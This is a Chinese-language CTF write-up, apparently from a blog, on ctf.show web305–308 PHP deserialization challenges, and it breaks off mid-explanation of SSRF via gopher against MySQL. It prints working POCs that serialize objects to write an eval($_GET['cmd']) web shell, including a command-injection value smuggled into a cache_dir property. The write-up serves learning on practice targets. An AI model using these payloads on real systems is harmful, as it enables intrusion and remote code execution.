+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd=system(<span class="string">&#x27;find / -type f -name &quot;*flag*&quot; &#x27;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>然后看到有个<code>/tmp/flag.sh</code>，cat看看</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash </span></span><br><span class="line"><span class="comment">#sed -i &quot;s/flag_here/$FLAG/&quot; /var/www/html/flag.php </span></span><br><span class="line">mysql -e <span class="string">&quot;DROP DATABASE IF EXISTS ctftraining; CREATE DATABASE IF NOT EXISTS sds;USE sds;CREATE TABLE \`sds_flabag\` (\`flag\` varchar(255) DEFAULT NULL) ENGINE=InnoDB DEFAULT CHARSET=utf8;INSERT INTO \`sds_flabag\` VALUES (&#x27;<span class="variable">$FLAG</span>&#x27;);&quot;</span> -uroot -proot </span><br><span class="line"><span class="built_in">export</span> FLAG=not_flag FLAG=not_flag <span class="built_in">rm</span> -f /flag.sh</span><br></pre></td></tr></table></figure>
+
+<p>注：这里可以看到<code>-uroot</code>和<code>-proot</code>，说明这个mysqli的用户名和密码都是root，而不是像代码里<code>conn.php</code>的root和phpcj。</p>
+<p>mysqli是在<code>conn.php</code>得知。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$mysqli</span>=@<span class="keyword">new</span> <span class="title function_ invoke__">mysqli</span>(<span class="variable">$mysqlhost</span>,<span class="variable">$mysqluser</span>,<span class="variable">$mysqlpwd</span>,<span class="variable">$mysqldb</span>);</span><br></pre></td></tr></table></figure>
+
+<p>由于过于粗心丢了不少细节，本来这个题能不靠wp做出来的，令人感叹。</p>
+<h2 id="web306"><a href="#web306" class="headerlink" title="web306"></a>web306</h2><p>提示说的是这题开始有MVC。</p>
+<blockquote>
+<p><strong>MVC 架构</strong>是一种软件设计模式，用于组织代码以分离关注点，提高应用程序的可维护性、灵活性和可扩展性。MVC 代表模型（Model）、视图（View）和控制器（Controller）。这种架构模式特别适用于开发用户界面，尤其是 web 应用程序中，允许用户界面的多个视图和数据模型的独立修改。</p>
+</blockquote>
+<blockquote>
+<p><strong>模型</strong>代表应用程序的数据逻辑。它直接管理数据、逻辑和规则，通常包括一个数据访问层，该层处理数据库的读写操作。模型负责访问存储数据的逻辑，提供数据的获取和存储的接口，但不涉及用户界面的处理。</p>
+</blockquote>
+<blockquote>
+<p><strong>视图</strong>负责展示数据（即模型）并发送用户指令（如按钮点击）给控制器。视图通常是依赖于模型数据的，用于展示那些数据给用户。视图只是展示给用户的数据的一个或多个特定的表示，而不包含业务逻辑或数据处理的代码。</p>
+</blockquote>
+<blockquote>
+<p><strong>控制器</strong>作为模型与视图之间的中介，处理用户的输入，调用模型对象进行数据的处理，最后将处理的结果展示给用户。控制器接收用户的输入（通常是通过视图），处理输入（可能涉及模型的修改），并通过视图输出结果。它解释用户输入，将其转化为对模型和视图的命令。</p>
+</blockquote>
+<blockquote>
+<p><strong>DAO（Data Access Object）</strong>是一种设计模式，用于抽象和封装对数据源的访问。它提供了一个统一的接口来访问数据库，使得应用程序可以通过简单的接口与数据源交互，而无需直接使用 SQL 语句或关注数据库的具体细节。</p>
+</blockquote>
+<p>思路是构造cookie直接未授权传包给dptadd.php。</p>
+<p>看了wp，发现不太对。wp都是通过<code>dao.php</code>的<code>__destruct()</code>方法的<code>conn-&gt;close()</code>来做的。这里说<code>conn</code>是<code>log</code>类，其<code>close()</code>方法有个<code>file_put_contents()</code>，可以写马。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">log</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$title</span>=<span class="string">&#x27;log.txt&#x27;</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$info</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">loginfo</span>(<span class="params"><span class="variable">$info</span></span>)</span>&#123;</span><br><span class="line">		<span class="variable language_">$this</span>-&gt;info=<span class="variable language_">$this</span>-&gt;info.<span class="variable">$info</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">close</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$this</span>-&gt;title, <span class="variable">$this</span>-&gt;info);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>但是，<code>dao</code>类这里的<code>conn</code>很明显是<code>mysqli</code>类的，而不是<code>log</code>类的，很令人费解。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dao</span></span>&#123;</span><br><span class="line">	<span class="keyword">private</span> <span class="variable">$config</span>;</span><br><span class="line">	<span class="keyword">private</span> <span class="variable">$conn</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="variable language_">$this</span>-&gt;config=<span class="keyword">new</span> <span class="title function_ invoke__">config</span>();</span><br><span class="line">		<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">init</span>();</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">init</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="variable language_">$this</span>-&gt;conn=<span class="keyword">new</span> <span class="title function_ invoke__">mysqli</span>(<span class="variable">$this</span>-&gt;config-&gt;<span class="title function_ invoke__">get_mysql_host</span>(),<span class="variable">$this</span>-&gt;config-&gt;<span class="title function_ invoke__">get_mysql_username</span>(),<span class="variable">$this</span>-&gt;config-&gt;<span class="title function_ invoke__">get_mysql_password</span>(),<span class="variable">$this</span>-&gt;config-&gt;<span class="title function_ invoke__">get_mysql_db</span>());</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;conn;</span><br><span class="line">		<span class="variable language_">$this</span>-&gt;conn-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line">	&#125;</span><br><span class="line">	...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="PHP序列化的方法问题"><a href="#PHP序列化的方法问题" class="headerlink" title="PHP序列化的方法问题"></a>PHP序列化的方法问题</h3><p>后面咨询了一下<a target="_blank" rel="noopener" href="https://z3r4y.blog.csdn.net/?type=blog">Z3r4y</a>师傅，得到了“php的序列化和反序列化只传输‘属性’，不传递方法”的回复。也就是说，序列化时的这个方法仅仅是在序列化时候用的。以下面的poc为例：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dao</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$config</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$conn</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;conn = <span class="keyword">new</span> <span class="title function_ invoke__">log</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">log</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$title</span>=<span class="string">&#x27;nihao.php&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$info</span>=<span class="string">&quot;&lt;?php eval(\$_GET[&#x27;cmd&#x27;]);?&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$dao</span> = <span class="keyword">new</span> <span class="title function_ invoke__">dao</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$dao</span>)));</span><br></pre></td></tr></table></figure>
+<p>序列化完成后是<code>O:3:&quot;dao&quot;:2:&#123;s:11:&quot; dao config&quot;;N;s:9:&quot; dao conn&quot;;O:3:&quot;log&quot;:2:&#123;s:5:&quot;title&quot;;s:9:&quot;nihao.php&quot;;s:4:&quot;info&quot;;s:27:&quot;&lt;?php eval($_GET[&#39;cmd&#39;]);?&gt;&quot;;&#125;&#125;</code>，没有出现任何方法名，全部是属性名-值。</p>
+<p>未做实验前在疑惑，这个代码与dao类定义时不一样，是否为一种“重写”？答案：不是。因为仅仅传递了属性，而未传递方法，方法仅仅是赋属性的一个手段，根本不存在方法，“重写”就更不是了。</p>
+<blockquote>
+<p>类里的construct就是方便给类属性赋值，比如private和protected那些；但其实也先可实例化对象然后再给对象属性赋值的，但要把类里的private,protected那些改成public。因为只传递“属性”，所以改了也没事，总之意思就是construct是给属性赋值的一个手段</p>
+</blockquote>
+<h2 id="web307"><a href="#web307" class="headerlink" title="web307"></a>web307</h2><p>查看逻辑，<code>login.php</code>有<code>unserialize()</code>方法，通过cookie的<code>user</code>参数可控；<code>service.php</code>定义了<code>service</code>类，含有<code>__wakeup()</code>魔术方法，会在unserialize()时调用。</p>
+<p>后面发现<code>service</code>类根本不需要调用，因为它是通过调用<code>dao</code>类进行<code>clearCache</code>函数的。<code>config</code>类和<code>dao</code>类组合就可以了。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">config</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cache_dir</span> = <span class="string">&#x27;cache&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dao</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$config</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;config=<span class="keyword">new</span> <span class="title function_ invoke__">config</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span>  <span class="title">clearCache</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">shell_exec</span>(<span class="string">&#x27;rm -rf ./&#x27;</span>.<span class="variable">$this</span>-&gt;config-&gt;cache_dir.<span class="string">&#x27;/*&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>组合使用</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dao</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$config</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;config=<span class="keyword">new</span> <span class="title function_ invoke__">config</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span>  <span class="title">clearCache</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">shell_exec</span>(<span class="string">&#x27;rm -rf ./&#x27;</span>.<span class="variable">$this</span>-&gt;config-&gt;cache_dir.<span class="string">&#x27;/*&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">config</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cache_dir</span> = <span class="string">&#x27;;echo &quot;&lt;?php eval(\$_GET[cmd]);?&gt;&quot; &gt; ./aaa.php;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> <span class="title function_ invoke__">dao</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$c</span>)));</span><br></pre></td></tr></table></figure>
+<p>看<code>unseralize()</code>函数，<code>login.php</code>和<code>logout.php</code>各有一个<code>unserialize</code>。<br>login.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;controller/service/service.php&#x27;</span>;</span><br><span class="line"><span class="variable">$user</span> = <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>]));</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$user</span>)&#123;</span><br><span class="line">	<span class="title function_ invoke__">header</span>(<span class="string">&quot;location:index.php&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>logout.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;service/service.php&#x27;</span>;</span><br><span class="line"><span class="keyword">unset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>]);</span><br><span class="line"><span class="keyword">unset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;error&#x27;</span>]);</span><br><span class="line"><span class="title function_ invoke__">setcookie</span>(<span class="string">&#x27;user&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="number">0</span>,<span class="string">&#x27;/&#x27;</span>);</span><br><span class="line"><span class="variable">$service</span> = <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;service&#x27;</span>]));</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$service</span>)&#123;</span><br><span class="line">	<span class="variable">$service</span>-&gt;<span class="title function_ invoke__">clearCache</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">setcookie</span>(<span class="string">&#x27;PHPSESSID&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="number">0</span>,<span class="string">&#x27;/&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">setcookie</span>(<span class="string">&#x27;service&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="number">0</span>,<span class="string">&#x27;/&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;location:../login.php&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>不能用的原因如下：</p>
+<ol>
+<li><code>login.php</code>仅仅是反序列化了，没有调用反序列化后对象的方法；当然，如果在反序列化时触发了对象类的魔术方法，且魔术方法内含有敏感函数（如<code>shell_exec</code>）那么这里也许就可以使用。</li>
+<li><code>logout.php</code>将反序列化后的对象赋到<code>$service</code>中，之后调用了<code>$service</code>类的<code>clearCache()</code>方法，这就让使用<code>dao</code>类成为了可能。为什么不能用<code>service</code>类呢？因为<code>service</code>类是通过<code>dao</code>类的<code>clearCache</code>方法做<code>shell_exec</code>，然而如果要反序列化<code>service</code>的话，<code>__wakeup()</code>魔术方法会被先调用，此时在<code>service</code>类中会重新实例化<code>dao</code>类和<code>config</code>类。如果本地动态调试过，会发现这两个类不是反序列化字符串中所定义的类。因为<strong>反序列化无法反序列化方法，只能反序列化属性</strong>。</li>
+</ol>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dao</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$config</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;config=<span class="keyword">new</span> <span class="title function_ invoke__">config</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span>  <span class="title">clearCache</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">shell_exec</span>(<span class="string">&#x27;rm -rf ./&#x27;</span>.<span class="variable">$this</span>-&gt;config-&gt;cache_dir.<span class="string">&#x27;/*&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">config</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cache_dir</span> = <span class="string">&#x27;;echo &quot;&lt;?php eval(\$_GET[cmd]);?&gt;&quot; &gt; ./aaa.php;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> <span class="title function_ invoke__">dao</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$c</span>)));</span><br></pre></td></tr></table></figure>
+
+<h2 id="web308-SSRF打无密码MySQL"><a href="#web308-SSRF打无密码MySQL" class="headerlink" title="web308 - SSRF打无密码MySQL"></a>web308 - SSRF打无密码MySQL</h2><p>提示：需要拿shell</p>
+<p>按照Kento大师启迪的初学者适用的审计过程，我们分成三步走：</p>
+<ol>
+<li>寻找敏感函数，如<code>shell_exec</code>，<code>eval</code>，<code>include</code>，<code>file_put_contents</code>等。</li>
+</ol>
+<p>在<code>dao.php</code>下有<code>clearCache()</code>方法，里面有<code>shell_exec</code>函数。但是有个<code>preg_match</code>挡住的waf，仅接受字母组成的输入。目前先保留绕过的可能性，看看别的地方；</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span>  <span class="title">clearCache</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^[a-z]+$/i&#x27;</span>, <span class="variable">$this</span>-&gt;config-&gt;cache_dir))&#123;</span><br><span class="line">		<span class="title function_ invoke__">shell_exec</span>(<span class="string">&#x27;rm -rf ./&#x27;</span>.<span class="variable">$this</span>-&gt;config-&gt;cache_dir.<span class="string">&#x27;/*&#x27;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><code>class.php</code>中有个<code>log</code>类，其<code>closelog()</code>方法中含有<code>file_put_contents</code>函数。但是全局搜索<code>closelog</code>方法和<code>log</code>类，都没有使用的地方，而且这也不是魔术函数。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">closelog</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	<span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$this</span>-&gt;title, <span class="variable">$this</span>-&gt;info);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<ol start="2">
+<li>找到敏感函数后，查看应用的方式。</li>
+</ol>
+<p>最后没忍住诱惑看了<a target="_blank" rel="noopener" href="https://ctf.show/writeups/729693">wp</a>。原来是使用ssrf通过gopher打sql。</p>
+<p>在<code>fun.php</code>这段函数中有一个敏感函数<code>curl_exec()</code>。就是执行一句curl。也是个敏感函数。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkUpdate</span>(<span class="params"><span class="variable">$url</span></span>)</span>&#123;</span><br><span class="line">		<span class="variable">$ch</span>=<span class="title function_ invoke__">curl_init</span>(); <span class="comment">//初始化CURL会话：$ch=curl_init();这一行创建了一个新的CURL会话并返回一个CURL句柄$ch，用于后续的CURL操作。</span></span><br><span class="line">		<span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>); <span class="comment">//设置要访问的URL。</span></span><br><span class="line">		<span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="literal">false</span>); <span class="comment">//确保不包含HTTP头部在内部输出。</span></span><br><span class="line">		<span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="literal">true</span>); <span class="comment">//让curl_exec执行后不直接输出结果，而是以字符串返回。</span></span><br><span class="line">		<span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_FOLLOWLOCATION, <span class="literal">true</span>); <span class="comment">//允许跟随任何“Location:”头信息中的重定向。</span></span><br><span class="line">		<span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_SSL_VERIFYPEER, <span class="literal">false</span>); </span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_SSL_VERIFYHOST, <span class="literal">false</span>); <span class="comment">//这两行关闭了SSL证书的验证。这意味着CURL会接受任何服务器证书，不论是否是由知名第三方CA签发，也不检查证书中的域名是否和访问的域名匹配。这在安全性上是有风险的，因为它使得客户端易受中间人攻击。</span></span><br><span class="line">		<span class="variable">$res</span> = <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>); <span class="comment">//执行CURL请求并获取结果：$res = curl_exec($ch);这一行执行CURL会话（即发起HTTP请求）。如果成功，curl_exec会返回请求的输出；如果失败，返回false。</span></span><br><span class="line">		<span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>); <span class="comment">//关闭CURL会话：curl_close($ch);关闭CURL资源，并释放系统资源。</span></span><br><span class="line">		<span class="keyword">return</span> <span class="variable">$res</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>调用该函数的类在<code>dao.php</code>的<code>dao</code>类。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checkVersion</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="title function_ invoke__">checkUpdate</span>(<span class="variable">$this</span>-&gt;config-&gt;update_url);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>调用<code>dao</code>实例的类在<code>service.php</code>的<code>service</code>类，方法叫<code>checkVersion</code>。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checkVersion</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;dao-&gt;<span class="title function_ invoke__">checkVersion</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>调用<code>service</code>实例中<code>checkVersion</code>方法的点在<code>index.php</code>。这里对<code>$_COOKIE[&#39;service&#39;]</code>进行反序列化，然后再进行<code>checkVersion</code>的调用。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$service</span> = <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;service&#x27;</span>]));</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$service</span>)&#123;</span><br><span class="line">    <span class="variable">$lastVersion</span>=<span class="variable">$service</span>-&gt;<span class="title function_ invoke__">checkVersion</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>那么，目前<code>checkUpdate($url)</code>中，checkUpdate()可以被调用了，那么<code>$url</code>该如何调用呢？在<code>dao</code>类中，有<code>$this-&gt;config-&gt;update_url</code>，而<code>$update_url</code>是这样的。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="variable">$update_url</span> = <span class="string">&#x27;https://vip.ctf.show/version.txt&#x27;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>我们发现<code>service</code>类的<code>checkVersion</code>和<code>dao</code>类的<code>checkVersion</code>是同名的，那么就可以直接不使用<code>service</code>类而使用<code>dao</code>类。更遑论<code>service</code>类的<code>__wakeup()</code>魔术方法对<code>dao</code>和<code>config</code>两个类实例化的影响了。（logout.php require了service.php，而service.php又require了&#x2F;dao&#x2F;dao.php，所以不需要用到service类也可以直接通过dao类调用checkVersion）</p>
+<p>那么我们就可以用<code>dao</code>和<code>config</code>两个类的反序列化进行SSRF。</p>
+<p>这里又陷入了僵局，不知道该怎么SSRF进去。知道是用Gopher协议，但是不知道该打哪儿。</p>
+<p>注意到<code>config.php</code>中，这个mysql是无密码root。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="variable">$mysql_username</span>=<span class="string">&#x27;root&#x27;</span>;</span><br><span class="line"><span class="keyword">private</span> <span class="variable">$mysql_password</span>=<span class="string">&#x27;&#x27;</span>;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>关于为什么可以用SSRF和Gopher攻击没有密码的MySQL数据库，这里涉及到几个关键点：</p>
+</blockquote>
+<blockquote>
